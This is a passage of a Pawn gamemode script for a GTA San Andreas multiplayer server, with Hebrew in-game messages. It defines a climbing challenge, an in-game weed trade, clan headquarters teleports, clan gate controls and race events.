CheDelObject[25] =CreateStreamObject(18367, 1671.179565, -2431.894531, 99.373596, 347.1084, 0.0000, 247.5000,100);
CheDelObject[26] =CreateStreamObject(18367, 1657.196655, -2406.981201, 100.414162, 347.1084, 0.0000, 168.7500,100);
CheDelObject[27] =CreateStreamObject(3280, 1657.497681, -2408.782715, 97.319832, 0.0000, 0.0000, 0.0000,100);
CheDelObject[28] =CreateStreamObject(3280, 1657.508179, -2407.587158, 97.319832, 0.0000, 0.0000, 0.0000,100);
CheDelObject[29] =CreateStreamObject(3280, 1657.483154, -2406.385986, 97.319832, 0.0000, 0.0000, 0.0000,100);
CheDelObject[30] =CreateStreamObject(3280, 1657.483154, -2405.561279, 98.044876, 90.2408, 0.0000, 358.2811,100);
CheDelObject[31] =CreateStreamObject(18367, 1645.770264, -2417.960449, 109.594154, 347.1084, 0.0000, 152.4979,100);
CheDelObject[32] =CreateStreamObject(3280, 1645.684082, -2418.574463, 108.741455, 0.0000, 0.0000, 351.4056,100);
CheDelObject[33] =CreateStreamObject(18367, 1662.898193, -2379.385498, 109.132889, 17.1887, 0.0000, 180.0000,100);
CheDelObject[34] =CreateStreamObject(1222, 1654.059082, -2428.472412, 92.961739, 0.0000, 0.0000, 0.0000,100);
CheDelObject[35] =CreateStreamObject(1222, 1660.067383, -2442.182617, 91.124886, 0.0000, 0.0000, 0.0000,100);
CheDelObject[36] =CreateStreamObject(1222, 1649.976929, -2448.242188, 82.402466, 0.0000, 0.0000, 0.0000,100);
CheDelObject[37] =CreateStreamObject(1222, 1649.479248, -2451.445068, 81.290794, 0.0000, 0.0000, 0.0000,100);
CheDelObject[38] =CreateStreamObject(1222, 1650.962524, -2452.138428, 78.797348, 0.0000, 0.0000, 0.0000,100);
CheDelObject[39] =CreateStreamObject(1222, 1650.402466, -2457.965820, 74.550095, 0.0000, 0.0000, 0.0000,100);
CheDelObject[40] =CreateStreamObject(1222, 1649.344849, -2470.849365, 65.996147, 0.0000, 0.0000, 0.0000,100);
CheDelObject[41] =CreateStreamObject(1222, 1653.144775, -2477.277344, 63.932148, 0.0000, 0.0000, 0.0000,100);
CheDelObject[42] =CreateStreamObject(1222, 1652.782104, -2474.846191, 64.527458, 0.0000, 0.0000, 0.0000,100);
CheDelObject[43] =CreateStreamObject(1222, 1651.370972, -2474.034424, 64.936928, 0.0000, 0.0000, 0.0000,100);
CheDelObject[44] =CreateStreamObject(1222, 1787.568237, -2543.593018, 28.771389, 0.0000, 0.0000, 0.0000,100);
CheDelObject[45] =CreateStreamObject(13638, 1771.913818, -2563.825439, 42.821404, 0.0000, 19.7670, 90.8595,100);
CheDelObject[46] =CreateStreamObject(3057, 1759.306152, -2541.212646, 44.974133, 0.0000, 0.0000, 0.0000,100);
CheDelObject[47] =CreateStreamObject(3057, 1755.714844, -2532.867432, 43.560070, 0.0000, 0.0000, 0.0000,100);
CheDelObject[48] =CreateStreamObject(3374, 1765.493286, -2560.903076, 43.733135, 0.0000, 0.0000, 0.0000,100);
CheDelObject[49] =CreateStreamObject(3374, 1659.718506, -2391.687500, 117.717461, 0.0000, 0.0000, 337.6546,100);
CheDelObject[50] =CreateStreamObject(3374, 1660.451416, -2389.815674, 116.720230, 0.0000, 0.0000, 337.6546,100);
CheDelObject[51] =CreateStreamObject(3374, 1660.772583, -2388.591064, 115.330429, 0.0000, 0.0000, 337.6546,100);
CheDelObject[52] =CreateStreamObject(18367, 1662.771118, -2352.528809, 103.945427, 14.6104, 357.4217, 190.7688,100);
CheDelObject[53] =CreateStreamObject(1238, 1662.104248, -2358.276611, 105.736588, 0.0000, 0.0000, 0.0000,100);
CheDelObject[54] =CreateStreamObject(1238, 1662.935059, -2358.355469, 105.750626, 0.0000, 0.0000, 0.0000,100);
CheDelObject[55] =CreateStreamObject(1238, 1627.243530, -2286.362061, 93.450989, 0.0000, 0.0000, 0.0000,100);
CheDelObject[56] =CreateStreamObject(18367, 1656.920654, -2324.610840, 100.083862, 44.6907, 357.4217, 190.7688,100);
CheDelObject[57] =CreateStreamObject(852, 1654.679077, -2314.694824, 92.738792, 0.0000, 0.0000, 0.0000,100);
CheDelObject[58] =CreateStreamObject(18367, 1652.552246, -2303.343506, 83.249512, 347.9679, 357.4217, 190.7688,100);
CheDelObject[59] =CreateStreamObject(18367, 1651.406494, -2274.390869, 92.817711, 9.4538, 6.8755, 293.0429,100);
CheDelObject[60] =CreateStreamObject(1437, 1779.593750, -2544.239258, 27.454693, 0.0000, 0.0000, 101.2500,100);
CheDelObject[61] =CreateStreamObject(1469, 1623.647583, -2288.529785, 93.621857, 0.0000, 0.0000, 270.0000,100);
CheDelObject[62] =CreateStreamObject(1469, 1624.108521, -2290.102295, 93.070335, 0.0000, 0.0000, 315.0000,100);
CheDelObject[63] =CreateStreamObject(1469, 1626.058350, -2291.741455, 93.064270, 0.0000, 0.0000, 326.2500,100);
CheDelObject[64] =CreateStreamObject(1469, 1627.917603, -2291.959473, 93.064270, 0.0000, 0.0000, 11.2500,100);
CheDelObject[65] =CreateStreamObject(1469, 1629.947021, -2291.178467, 93.064270, 0.0000, 0.0000, 33.7500,100);
CheDelObject[66] =CreateStreamObject(1469, 1631.632446, -2289.481201, 93.064262, 0.0000, 0.0000, 56.2500,100);
CheDelObject[67] =CreateStreamObject(1469, 1632.447876, -2287.502686, 93.070335, 0.0000, 0.0000, 90.0000,100);
CheDelObject[68] =CreateStreamObject(1469, 1632.604614, -2285.693604, 93.070335, 0.0000, 0.0000, 90.0000,100);
CheDelObject[69] =CreateStreamObject(1469, 1627.558350, -2281.010254, 93.036552, 0.0000, 0.0000, 180.0000,100);
CheDelObject[70] =CreateStreamObject(1469, 1625.826782, -2281.394775, 93.070335, 0.0000, 0.0000, 191.2500,100);
CheDelObject[71] =CreateStreamObject(1469, 1624.483521, -2282.059814, 93.070335, 0.0000, 0.0000, 213.7500,100);
CheDelObject[72] =CreateStreamObject(1469, 1622.609131, -2283.672607, 93.070335, 0.0000, 0.0000, 225.0000,100);
CheDelObject[73] =CreateStreamObject(1469, 1621.920166, -2285.461670, 93.070335, 0.0000, 0.0000, 270.0000,100);
CheDelObject[74] =CreateStreamObject(1469, 1622.291016, -2287.888672, 93.070335, 0.0000, 0.0000, 292.5000,100);
CheDelObject[75] =CreateStreamObject(1472, 1630.924072, -2283.461670, 92.708344, 0.8594, 0.0000, 123.7500,100);
CheDelObject[76] =CreateStreamObject(3867, 1626.164673, -2279.034668, 100.013901, 0.0000, 0.0000, 180.0000,100);
CheDelObject[77] =CreateStreamObject(3867, 1618.888428, -2284.212402, 100.049995, 0.0000, 0.0000, 270.0000,100);
CheDelObject[78] =CreateStreamObject(3867, 1625.968384, -2292.777344, 100.516640, 0.0000, 0.0000, 4.3745,100);


return 1; }
//===============================ChaJoin Command================================
if(!strcmp(cmd, "/Cha", true)) {
if(ChaOn == 0) return SendClientMessage(playerid, WHITE, ".אין עכשיו האתגר טיפוס פעילה");
if(ChaStart == 1) return SendClientMessage(playerid, WHITE, ".האתגר טיפוס כבר התחילה, נסה פעם הבאה ");
if(ChaPlayers == sizeof(ChaSpawn)) return SendClientMessage(playerid, WHITE, ".כל המקומות נתפסו, נסה פעם באה");
if(InCha[playerid] == 1) return SendClientMessage(playerid, WHITE, ".הצטרפת כבר להאתגר טיפוס, אנא המתן");
GetPlayerName(playerid, playername, sizeof(playername));
ChaPlayers ++; InCha[playerid] = 1;


format(string,sizeof(string),".%d :הינך משתתף/ת מספר",ChaPlayers);
SendClientMessage(playerid,0xE21E1EFF,string);
format(string,sizeof(string),".בעת התחלת האתגר, התחל לטפס על ההר, הראשון שיגיע ינצח");
SendClientMessage(playerid,0xE21E1EFF,string);
if(AirBreakVar[playerid] == 1)
{
AirBreakVar[playerid] = 0;
TogglePlayerControllable(playerid, 1);
SendClientMessage(playerid, WHITE, ".האייר ברייק שלך כובה בהצלחה");
}

return 1; }
//===============================ChaEnd Command================================
if(!strcmp(cmd, "/Chaend", true)) {
if(ChaOn == 0) return SendClientMessage(playerid, red, ".אין עכשיו האתגר טיפוס פעילה");
if(ChaStart == 1) return SendClientMessage(playerid, red, ".האתגר טיפוס כבר התחילה ");
if(!IsPlayerXAdmin(playerid,1)) return SendClientMessage(playerid, red, ".אתה לא אדמין ");
GetPlayerName(playerid, Chaadminsname, sizeof(Chaadminsname));
CountChallenge = 0;
ChaEnd(2);
return 1; }


//------------
if(strcmp(cmd, "/sellweed", true) == 0)
{
tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
//----Syntex Error
if(!strlen(tmp)) return SendClientMessage(playerid, WHITE, "Usage: /sellweed [playerid]");
if(PS[playerid] == 1)return SendClientMessage(playerid, red, ".אתה נמצא בעסקה כבר");
giveplayerid = strval(tmp);
if(20 < strlen(tmp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if (IsPlayerConnected(giveplayerid)){
GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
GetPlayerName(playerid, sendername, sizeof(sendername));
fnm
if(offerweed[i][giveplayerid] == 1)return SendClientMessage(playerid,red,".הבנאדם שאתה מנסה למכור לו כבר נמצא בעיסקה");
return 3;
}

if (PlayerInfo[playerid][Weeds] > 0 && PlayerInfo[playerid][Weeds] <= 3)
{
format(string, sizeof(string), " [$%d] מנת סמים במחיר [ID:%d] %s הצעת ל ", WeedCost, giveplayerid, giveplayer);
SendClientMessage(playerid, lblue, string);
format(string, sizeof(string), " [$%d] מציע לך לקנית מנת סמים במחיר [ID:%d] %s ", WeedCost, playerid, sendername);
SendClientMessage(giveplayerid, lblue, string);
format(string, sizeof(string), " /BuyWeed אם אתה רוצה לקנות את המנה תשתמש בפקודה ");
SendClientMessage(giveplayerid, lblue, string);
offerweed[playerid][giveplayerid] = 1;
PS[playerid] = 1;
CB[giveplayerid] = 1;
}else{
SendClientMessage(playerid, red, " אין לך סמים ");
}}else{
format(string, sizeof(string), " לא מחובר [ID:%d] ", giveplayerid);
SendClientMessage(playerid, lblue, string);}
return 1;
}

if(!strcmp(cmd,"/buyweed",true))
{
if(CB[playerid] == 0) return SendClientMessage(playerid,WHITE," אף אחד לא הציע לך לקנות סמים ");
if(PlayerInfo[playerid][Weeds] == 3)
{
SendClientMessage(playerid,WHITE," מנות כבר ואינך יכול לקנות עוד %d/3 יש לך  ");
for(new i = 0;i<MAX_PLAYERS;i++)
offerweed[i][playerid] = 0;
format(string, sizeof(string), " לא יכול לקנות עוד סמים [ID:%d] %s העסקה בוטלה מכיוון שהשחקן ", giveplayerid, giveplayer);
SendClientMessage(playerid, lblue, string);
return 1;
}
fnm
if(offerweed[i][playerid] == 1)
{
if(PlayerInfo[playerid][Weeds] <= 3)
{
if(GetPlayerMoney(playerid)>999)
{
LACY_GiveMoney(i,1000); LACY_GiveMoney(playerid,-1000);
PlayerInfo[playerid][Weeds]++;
new name[MAX_PLAYER_NAME];
GetPlayerName(i,name,sizeof(name));
format(string,256,"[%d$]במחיר [ID:%d]%s קנית סמים בהצלחה מ",WeedCost,i,name);
SendClientMessage(playerid, lblue, string);
GetPlayerName(playerid,name,sizeof(name));
format(string,256,"[%d$] במחיר [ID : %d]%s מכרת בהצלחה סמים ל",WeedCost,playerid,name);
offerweed[i][playerid] = 0;
PS[playerid] = 0;
PS[i] = 0;
PlayerInfo[i][Weeds]--;
return 1;
}
else
{
SendClientMessage(playerid,WHITE,"אין לך מספיק כסף");
}
}
else
{
SendClientMessage(playerid,WHITE,"הכיס שלך כבר מלא בסמים");
}
}
}
return 1;
}



if(!strcmp(cmd,"/declinedeal",true))
{
fnm
if(offerweed[i][playerid] == 1)
{
new pname[MAX_PLAYER_NAME];
GetPlayerName(playerid,pname,sizeof(pname));
format(string,256," ביטל את העסקה [ID:%d] %s ",playerid,pname);
SendClientMessage(i, lblue, string);
SendClientMessage(playerid, WHITE, " אתה ביטלת את עיסקת הסמים ");
offerweed[i][playerid] = 0;
CB[i] = 0;
CB[playerid] = 0;
PS[playerid] = 0;
PS[i] = 0;
return 1;
}
}
SendClientMessage(playerid,WHITE,"אין לך עיסקת סמים עם אף אחד");
return 1;
}
//-=-=-=-=-=-
if(strcmp(cmd, "/kill", true) == 0)
{

PlayerInfo[playerid][Deaths] = PlayerInfo[playerid][Deaths] --;
antianti[playerid] = 0;
SetPlayerHealth(playerid,0.0);
mini[playerid] = 0;
SendClientMessage(playerid,COLOR_YELLOW, ".התאבדת");

return 1;
}




if(strcmp(cmdtext, "/hq", true)==0)
{
if(strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"ST",true) == 0)
{

CreateTeleport(playerid,0,-419.2169, -631.9835, 11.3793,109.0739,1);
return 1;
}

if(strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"[HM]",true) == 0)
{
CreateTeleport(playerid,0, -1531.9507, 473.5179, 7.1875,263.7990,1);
return 1;
}

if(strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"RS",true) == 0)
{
CreateTeleport(playerid,0,-2581.5437, 1344.7869, 7.0391,44.3254,1);
return 1;
}

if(strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"[NM]",true) == 0)
{
CreateTeleport(playerid,0,1195.4961, -2037.1492, 69.0078,90.5195,1);
return 1;
}

if(strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"[RoX]",true) == 0)
{
CreateTeleport(playerid,0,-128.8800, -185.8082, 1.4340,350.4436,1);
return 1;
}
if(dini_Int(GetPlayerFile(playerid),"ClanLvl") < 1) return SendClientMessage(playerid,red,".אתה לא נמצא בשום קלאן");
else if(dini_Int(GetPlayerFile(playerid),"ClanLvl") > 1) return SendClientMessage(playerid,WHITE,".אין לקלאן שלך מפקדה");
return 1;
}





 
if(strcmp(cmdtext, "/ogate", true)==0 || strcmp(cmdtext, "/og", true)==0)
{

if(strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"ST",true) == 0)
{

if(PlayerToPoint(20.0,playerid, -600.864380, -484.458282, 22.520319))
{
MoveStreamObject(Move6, -600.864380, -484.458282, 16.770319,4);
return true;
}

else if(PlayerToPoint(20.0,playerid,-490.520477, -562.596069, 26.996830))
{
MoveStreamObject(Move5, -490.520477, -562.596069, 21.621832,4);
return true;
}

return SendClientMessage(playerid,red,".אנא התקרב לאחד מהשערים");
}


if(strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"[HM]",true) == 0)
{
if(PlayerToPoint(20.0,playerid, -1508.946533, 471.620514, 8.960892))
{
MoveStreamObject(Move7, -1508.946533, 471.620514, 3.210892,4);
return true;
}

return SendClientMessage(playerid,red,".אנא התקרב לאחד מהשערים");
}

if(strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"RS",true) == 0)
{
if(PlayerToPoint(20.0,playerid, -2589.178955, 1352.178223, 8.828062))
{
MoveStreamObject(Move3, -2589.178955, 1352.178223, 3.328062,4);
return true;
}

if(PlayerToPoint(20.0,playerid, -2616.550781, 1421.681396, 7.994058))
{
MoveStreamObject(Move4, -2616.550781, 1421.681396, 24.644060,4);
return true;
}

return SendClientMessage(playerid,red,".אנא התקרב לאחד מהשערים");
}

if(strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"[NM]",true) == 0)
{

if(PlayerToPoint(10.0,playerid, 1211.504272, -2039.203613, 70.732048))
{
MoveStreamObject(NM1,1211.504272, -2039.203613, 63.732048,2);
return true;
}

if(PlayerToPoint(10.0,playerid, 1153.494507, -2044.161255, 67.997490))
{
MoveStreamObject(NM2,1153.494507, -2044.161255, 59.097490,2);
MoveStreamObject(NM3,1150.927368, -2040.386353, 74.647285,1);
return true;
}

return SendClientMessage(playerid,red,".אנא התקרב לאחד מהשערים");
}

if(strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"[RoX]",true) == 0)
{
if(PlayerToPoint(20.0,playerid,-112.651115, -108.752769, 4.882787))
{
MoveStreamObject(Move1, -112.651115, -108.752769, -0.867213,4);
return true;
}

if(!PlayerToPoint(23.0,playerid, -109.697838, 65.238770, 0.814069))
{
MoveStreamObject(Move2, -109.697838, 65.238770, -5.435931,4);
return true;
}

return SendClientMessage(playerid,red,".אנא התקרב לאחד מהשערים");
}

if(dini_Int(GetPlayerFile(playerid),"ClanLvl") < 1) return SendClientMessage(playerid,red,".אתה לא נמצא בשום קלאן");
else if(dini_Int(GetPlayerFile(playerid),"ClanLvl") > 1) return SendClientMessage(playerid,WHITE,".אין לקלאן שלך מפקדה");
return 1;
}

if(strcmp(cmdtext, "/cg" ,true)==0 || strcmp(cmdtext,"/closegate",true) == 0)
{

if(strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"ST",true) == 0)
{
if(PlayerToPoint(20.0,playerid,-490.520477, -562.596069, 21.621832))
{
MoveStreamObject(Move5,-490.520477, -562.596069, 26.996830,4);
return true;
}

if(PlayerToPoint(20.0,playerid, -600.864380, -484.458282, 16.770319))
{
MoveStreamObject(Move6,-600.864380, -484.458282, 22.520319,4);
return true;
}

return SendClientMessage(playerid,red,".אנא התקרב לאחד מהשערים");
}


if(strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"[HM]",true) == 0)
{
if(!PlayerToPoint(20.0,playerid, -1508.946533, 471.620514, 8.960892))
{
MoveStreamObject(Move7, -1508.946533, 471.620514, 8.960892,4);
return true;
}

return SendClientMessage(playerid,red,".אנא התקרב לאחד מהשערים");
}


if(strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"RS",true) == 0)
{
if(PlayerToPoint(20.0,playerid, -2589.178955, 1352.178223, 3.328062))
{
MoveStreamObject(Move3,-2589.178955, 1352.178223, 8.828062,4);
return true;
}


if(PlayerToPoint(20.0,playerid,  -2616.550781, 1421.681396, 24.644060))
{
MoveStreamObject(Move4,-2616.550781, 1421.681396, 7.994058,4);
return true;
}

return SendClientMessage(playerid,red,".אנא התקרב לאחד מהשערים");
}

if(strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"[NM]",true) == 0)
{
if(PlayerToPoint(10.0,playerid, 1211.504272, -2039.203613, 63.732048))
{
MoveStreamObject(NM1, 1211.504272, -2039.203613, 70.732048,3);
return true;
}


if(!PlayerToPoint(20.0,playerid, 1153.494507, -2044.161255, 67.997490))
{
MoveStreamObject(NM2,1153.494507, -2044.161255, 67.997490,3);
MoveStreamObject(NM3,1150.846802, -2040.520508, 74.647285,1);
return true;
}

return SendClientMessage(playerid,red,".אנא התקרב לאחד מהשערים");
}

if(strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"[RoX]",true) == 0)
{
if(PlayerToPoint(20.0,playerid, -112.651115, -108.752769, -0.867213))
{
MoveStreamObject(Move1,-112.651115, -108.752769, 4.882787,4);
return true;
}

if(PlayerToPoint(23.0,playerid,-109.697838, 65.238770, 0.814069))
{
MoveStreamObject(Move2,-109.697838, 65.238770, 0.814069,4);
return true;
}


return SendClientMessage(playerid,red,".אנא התקרב לאחד מהשערים");
}

if(dini_Int(GetPlayerFile(playerid),"ClanLvl") < 1) return SendClientMessage(playerid,red,".אתה לא נמצא בשום קלאן");
else if(dini_Int(GetPlayerFile(playerid),"ClanLvl") > 1) return SendClientMessage(playerid,WHITE,".אין לקלאן שלך מפקדה");
return 1;
}





//==
if(!strcmp(cmd,"/CityStart",true))
{
if(!IsPlayerXAdmin(playerid,10)) return 1;
new TYPE_Race[256];
TYPE_Race = strtok(cmdtext,idx);
if(20 < strlen(TYPE_Race)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");

if(!strlen(TYPE_Race))
return
SendClientMessage(playerid, COLOR_WHITE, "Usage: /CityStart [SF/LS]");
if(20 < strlen(TYPE_Race)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");

if(CityRaceingOn == 1 || CityRaceingOn == 5 || CityRaceingOn == 2) return SendClientMessage(playerid, red, ".המירוץ ערים התחיל נסה פעם הבאה");

CityRaceingStart();


if(strcmp(TYPE_Race,"SF",true) == 0) return CityRaceingOn = 1;

if(strcmp(TYPE_Race,"LS",true) == 0) return CityRaceingOn = 2;

return 1;
}


if(!strcmp(cmd,"/CityRace",true))
{
if (CityRaceingOn == 5) return SendClientMessage(playerid, red, ".אין מירוץ ערים פעיל כרגע");
if(CityRaceingPlayers == 10) return SendClientMessage(playerid,red,"ההרשמה נסגרה, כל המקומות נתפסו. נסה פעם הבאה");
if(InCityRaceing[playerid] > 0) return SendClientMessage(playerid,red,".הינך רשום למירוץ זה");
if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red,".אנא היכנס לרכב על מנת להשתתף במירוץ");
if(CityRaceingOn == 1)
{
DisablePlayerRaceCheckpoint(playerid);
new vehicleid = GetPlayerVehicleID(playerid);
SetPlayerVirtualWorld(playerid,1);
SetVehicleVirtualWorld(vehicleid,1);
TogglePlayerControllable(playerid,0);
CityRaceingPlayers ++;

if(CityRaceingPlayers == 1)
{
format(string,sizeof(string),".הצטרף לפעילות ראשון וקיבל צו'פר של 1,000 דולר %s השחקן",GetName(playerid));
SendClientMessageToAll(0xE21E1EFF,string);
LACY_GiveMoney(playerid,1000);

}

CityCP[playerid] = 1;
Player_Var[playerid] = CityRaceingPlayers;
InCityRaceing[playerid] = 1;

SetPlayerRaceCheckpoint(playerid,0,CityCPs[CityCP[playerid]][0],CityCPs[CityCP[playerid]][1],CityCPs[CityCP[playerid]][2],CityCPs[CityCP[playerid]+1][0],CityCPs[CityCP[playerid]+1][1],CityCPs[CityCP[playerid]+1][2],30.0);
SetVehiclePos(GetPlayerVehicleID(playerid), RandomCityRace[Player_Var[playerid]][0], RandomCityRace[Player_Var[playerid]][1], RandomCityRace[Player_Var[playerid]][2]);
SetVehicleZAngle(GetPlayerVehicleID(playerid), RandomCityRace[Player_Var[playerid]][3]);


format(string,sizeof(string),".%d :הינך משתתף/ת מספר",CityRaceingPlayers);
SendClientMessage(playerid,0xE21E1EFF,string);
format(string,sizeof(string),".בעת התחלת הקרב, תתחיל לנסוע כמה שיותר מהר לצ'ק פוינטים האדומים על המסלול מירוץ ערים");
SendClientMessage(playerid,0xE21E1EFF,string);
return 1;
}

if(CityRaceingOn == 2)
{
DisablePlayerRaceCheckpoint(playerid);
new vehicleid = GetPlayerVehicleID(playerid);
SetPlayerVirtualWorld(playerid,1);
SetVehicleVirtualWorld(vehicleid,1);
TogglePlayerControllable(playerid,0);
CityRaceingPlayers ++;
InCityRaceing2[playerid] = 1;
CityCP[playerid] = 1;
Player_Var[playerid] = CityRaceingPlayers;

SetPlayerRaceCheckpoint(playerid,0,CityCPs2[CityCP[playerid]][0],CityCPs2[CityCP[playerid]][1],CityCPs2[CityCP[playerid]][2],CityCPs2[CityCP[playerid]+1][0],CityCPs2[CityCP[playerid]+1][1],CityCPs2[CityCP[playerid]+1][2],30.0);
SetVehiclePos(GetPlayerVehicleID(playerid), RandomCityRace2[Player_Var[playerid]][0], RandomCityRace2[Player_Var[playerid]][1], RandomCityRace2[Player_Var[playerid]][2]);
SetVehicleZAngle(GetPlayerVehicleID(playerid), RandomCityRace2[Player_Var[playerid]][3]);

format(string,sizeof(string),".%d :הינך משתתף/ת מספר",CityRaceingPlayers);
SendClientMessage(playerid,0xE21E1EFF,string);
format(string,sizeof(string),".בעת התחלת הקרב, תתחיל לנסוע כמה שיותר מהר לצ'ק פוינטים האדומים על המסלול מירוץ ערים");
SendClientMessage(playerid,0xE21E1EFF,string);

return 1;
}

return 1;
}


//---RaceSystem
if(strcmp(cmd, "/races", true) == 0)
{
new Roy_Killer[256];
Roy_Killer= strtok(cmdtext, idx);
if(20 < strlen(Roy_Killer)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(Roy_Killer))
{
SendClientMessage(playerid,WHITE,"Usage: /races [action]");
SendClientMessage(playerid,WHITE,"/races join - להצטרפות למירוץ");
SendClientMessage(playerid,WHITE,"/races drift - להפעלת מירוץ הדריפטים");
SendClientMessage(playerid,WHITE,"/races bike - להפעלת מירוץ האופנועים");
SendClientMessage(playerid,WHITE,"/races race - להפעלת מירוץ האופנועים");
return 1;
}

if(strcmp(Roy_Killer,"drift",true) == 0)
{
if (!IsPlayerXAdmin(playerid,10)) return SendClientMessage(playerid,red,".פקודה זאתי משמשת אדמין בלבד, תודה");
if(IFDriftOn == 1 || IFraceOn==1 || BikeOn == 1) return SendClientMessage(playerid,WHITE,".יש מירוץ מופעל, חכה שיסתיים");
DriftPlayer =0,DriftEnd=0,WinnerDrift=1,IFDriftOn=1,StartDrift(),SetTimer("UnFreezeDrift",60*1000,0);
format(kboobcha, sizeof(kboobcha), "~y~~H~[]/races join~y~~H~[]");
GameTextForAll(kboobcha,3000,4);
return 1;
}

if(strcmp(Roy_Killer,"race",true) == 0)
{
if (!IsPlayerXAdmin(playerid,10)) return SendClientMessage(playerid,red,".פקודה זאתי משמשת אדמין בלבד, תודה");
if(IFDriftOn == 1 || IFraceOn==1 || BikeOn == 1) return SendClientMessage(playerid,WHITE,".יש מירוץ מופעל, חכה שיסתיים");
RaceEnd=0,WinnerRace=1,IFraceOn=1,StartRace(),SetTimer("UnFreezeRace",60*1000,0);
format(kboobcha, sizeof(kboobcha), "~y~~H~[]/races join~y~~H~[]");
GameTextForAll(kboobcha,3000,4);
return 1;
}
if(strcmp(Roy_Killer,"bike",true) == 0)
{
if (!IsPlayerXAdmin(playerid,10)) return  SendClientMessage(playerid, red, ".פקודה זאתי משמשת אדמינים בלבד");
if(IFDriftOn == 1 || IFraceOn==1 || BikeOn == 1) return SendClientMessage(playerid,WHITE,".יש מירוץ מופעל, חכה שיסתיים");
format(kboobcha, sizeof(kboobcha), "~y~~H~[]/races join~y~~H~[]");
GameTextForAll(kboobcha,3000,4);
BikeStart();
return 1;
}

if(strcmp(Roy_Killer,"join",true) == 0)
{
if(IFraceOn ==0 && IFDriftOn == 0 && BikeOn == 0) return SendClientMessage(playerid,WHITE,".אין עכשיו מירוץ מופעל");
if(IFraceOn == 1)
{
if(RaceEnd==1) return SendClientMessage(playerid,WHITE,".ההרשמה כבר נסגרה");
if(RacePlayers==15) return SendClientMessage(playerid,WHITE,".כל המקומות נתפסו");
if(Youregisterrace[playerid] ==1) return SendClientMessage(playerid,WHITE,"אתה כבר רשום.");
if(!(IsPlayerInAnyVehicle(playerid))) return SendClientMessage(playerid,WHITE,".אנא כנס לרכב כדאי להירשם");
RacePlayers++;
Youregisterrace[playerid] =1;

if(RacePlayers == 1)
{
format(string,sizeof(string),".הצטרף לפעילות ראשון וקיבל צו'פר של 1,000 דולר %s השחקן",GetName(playerid));
SendClientMessageToAll(0xE21E1EFF,string);
LACY_GiveMoney(playerid,1000);

}

format(string,sizeof(string),".%d :הינך משתתף/ת מספר",RacePlayers);
SendClientMessage(playerid,0xE21E1EFF,string);
format(string,sizeof(string),".בעת התחלת הקרב, תתחיל לנסוע כמה שיותר מהר לצ'ק פוינטים האדומים על המסלול מירוץ");
SendClientMessage(playerid,0xE21E1EFF,string);

if(AirBreakVar[playerid] == 1)
{
AirBreakVar[playerid] = 0;
SendClientMessage(playerid, WHITE, ".האייר ברייק שלך כובה בהצלחה");
}
new vehicleid = GetPlayerVehicleID(playerid);
SetPlayerVirtualWorld(playerid,1);
SetVehicleVirtualWorld(vehicleid,1);
SetPlayerRaceCheckpoint(playerid, 2,1942.3159,852.1760,6.7267,1942.3159,852.1760,6.7267, 28);//CP2
TogglePlayerControllable(playerid,0);
RaceCP[playerid]=1;

if(RacePlayers ==1)return SetVehiclePos(vehicleid,1983.5819,847.9211,6.4336),SetVehicleZAngle(vehicleid,90.5373);
if(RacePlayers ==2)return SetVehiclePos(vehicleid,1983.6615,850.6814,6.4537),SetVehicleZAngle(vehicleid,91.4519);
if(RacePlayers ==3)return SetVehiclePos(vehicleid,1983.8606,854.0459,6.4420),SetVehicleZAngle(vehicleid,89.7399);
if(RacePlayers ==4)return SetVehiclePos(vehicleid,1983.2966,856.1102,6.4422),SetVehicleZAngle(vehicleid,90.7140);
if(RacePlayers ==5)return SetVehiclePos(vehicleid,1983.3856,858.5254,6.4604),SetVehicleZAngle(vehicleid,87.1792);
if(RacePlayers ==6)return SetVehiclePos(vehicleid,1984.0253,861.0951,6.4507),SetVehicleZAngle(vehicleid,89.2950);
if(RacePlayers ==7)return SetVehiclePos(vehicleid,1983.4742,866.4510,7.1593),SetVehicleZAngle(vehicleid,88.3443);
if(RacePlayers ==8)return SetVehiclePos(vehicleid,1983.2288,869.5640,7.8530),SetVehicleZAngle(vehicleid,90.3711);
if(RacePlayers ==9)return SetVehiclePos(vehicleid,1983.3806,873.7965,8.6849),SetVehicleZAngle(vehicleid,83.9591);
if(RacePlayers ==10)return SetVehiclePos(vehicleid,1983.1357,839.5808,6.4415),SetVehicleZAngle(vehicleid,91.7967);
if(RacePlayers ==11)return SetVehiclePos(vehicleid,1983.2297,836.8755,6.4486),SetVehicleZAngle(vehicleid,95.1153);
if(RacePlayers ==12)return SetVehiclePos(vehicleid,1983.2699,834.2242,6.4450),SetVehicleZAngle(vehicleid,96.4373);
if(RacePlayers ==13)return SetVehiclePos(vehicleid,1983.4442,831.6970,6.4406),SetVehicleZAngle(vehicleid,90.6232);
if(RacePlayers ==14)return SetVehiclePos(vehicleid,1983.6328,828.6913,6.4505),SetVehicleZAngle(vehicleid,89.9238);
if(RacePlayers ==15)return SetVehiclePos(vehicleid,1983.5974,825.3797,6.5348),SetVehicleZAngle(vehicleid,88.5591);

return 1;
}

if(IFDriftOn == 1)
{
if(DriftEnd==1) return SendClientMessage(playerid,WHITE,".ההרשמה כבר נסגרה");
if(DriftPlayer==22) return SendClientMessage(playerid,WHITE,".כל המקומות נתפסו");
